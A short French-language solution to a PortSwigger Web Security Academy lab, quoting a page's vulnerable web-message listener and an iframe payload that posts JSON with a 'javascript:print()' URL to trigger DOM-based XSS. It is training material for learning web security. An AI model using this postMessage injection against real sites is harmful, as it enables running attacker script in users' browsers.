# Lab

https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

## Solution

Dans les sources de la page d'accueil on voit ce script :

```html
<script>
  window.addEventListener("message", function (e) {
      var iframe = document.createElement("iframe"), ACMEplayer = { element: iframe }, d;

      document.body.appendChild(iframe);
      try {
        d = JSON.parse(e.data);
      } catch (e) {
        return;
      }

      switch (d.type) {
        case "page-load":
          ACMEplayer.element.scrollIntoView();
          break;
        case "load-channel":
          ACMEplayer.element.src = d.url;
          break;
        case "player-height-changed":
          ACMEplayer.element.style.width = d.width + "px";
          ACMEplayer.element.style.height = d.height + "px";
          break;
      }
    },
    false
  );
</script>
```

Pour faire apparaître la pop-up `print()` on peut utiliser le code suivant :

```html
<iframe src="https://0a8400520301e60c83521e5900050083.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```